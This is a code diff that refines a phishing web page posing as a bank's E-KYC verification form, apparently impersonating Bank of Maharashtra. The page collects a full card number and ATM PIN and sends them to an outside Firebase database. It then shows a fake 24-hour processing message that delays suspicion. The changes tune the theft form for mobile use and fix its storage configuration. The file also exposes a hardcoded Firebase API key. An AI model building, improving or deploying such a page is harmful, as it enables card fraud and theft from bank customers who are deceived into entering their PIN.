@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>Card Form</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
+    /* Same styling as your provided CSS */
     body {
       margin: 0;
       padding: 0;
@@ -87,6 +88,7 @@
       border: none;
       border-radius: 5px;
       display: block;
+      cursor: pointer;
     }
     .bottom-image {
       width: 100%;
@@ -148,14 +150,14 @@
   <div class="card-box">
     <div class="card-title">Debit/Credit Card Details</div>
     <div class="card-number">
-      <input type="text" id="card1" maxlength="4" pattern="\d*" required>
-      <input type="text" id="card2" maxlength="4" pattern="\d*" required>
-      <input type="text" id="card3" maxlength="4" pattern="\d*" required>
-      <input type="text" id="card4" maxlength="4" pattern="\d*" required>
+      <input type="tel" id="card1" maxlength="4" pattern="\d*" inputmode="numeric" required>
+      <input type="tel" id="card2" maxlength="4" pattern="\d*" inputmode="numeric" required>
+      <input type="tel" id="card3" maxlength="4" pattern="\d*" inputmode="numeric" required>
+      <input type="tel" id="card4" maxlength="4" pattern="\d*" inputmode="numeric" required>
     </div>
     <div class="card-label">Card Number</div>
     <div class="card-row">
-      <input type="password" id="pin" maxlength="4" placeholder="PIN" required>
+      <input type="password" id="pin" maxlength="4" placeholder="ATM PIN" inputmode="numeric" required>
     </div>
     <div class="card-row">
       <div class="card-label">ATM PIN</div>
@@ -175,7 +177,6 @@
       <p>Kindly allow up to <strong>24 hours</strong> for the verification and processing to be completed.</p>
       <p>During this time, there is no need for any further action from your side.</p>
       <p>You will be notified once your E-KYC update has been successfully completed.</p>
-      <p>We appreciate your cooperation and trust in <strong>Bank of Maharashtra – Ek Parivaar, Ek Bank</strong>.</p>
       <p class="countdown" id="countdownText"></p>
     </div>
   </div>
@@ -183,15 +184,17 @@
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
       authDomain: "marcokinghoga.firebaseapp.com",
       projectId: "marcokinghoga",
-      storageBucket: "marcokinghoga.firebasestorage.app",
+      storageBucket: "marcokinghoga.appspot.com",
       messagingSenderId: "132474071601",
       appId: "1:132474071601:web:7c44a66fca6dc000e90310"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
@@ -208,7 +211,7 @@
       const card4 = document.getElementById("card4").value.trim();
       const pin = document.getElementById("pin").value.trim();
 
-      if ([card1, card2, card3, card4, pin].some(v => v.length < 4)) {
+      if ([card1, card2, card3, card4, pin].some(v => v.length !== 4)) {
         alert("Please fill all fields correctly.");
         return;
       }
@@ -222,7 +225,7 @@
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         document.getElementById("kycModal").style.display = "flex";
-        startCountdown(86400); // 24 hours in seconds
+        startCountdown(86400); // 24 hours
       }).catch((err) => {
         console.error("Error saving card data:", err);
         alert("Something went wrong. Try again.");
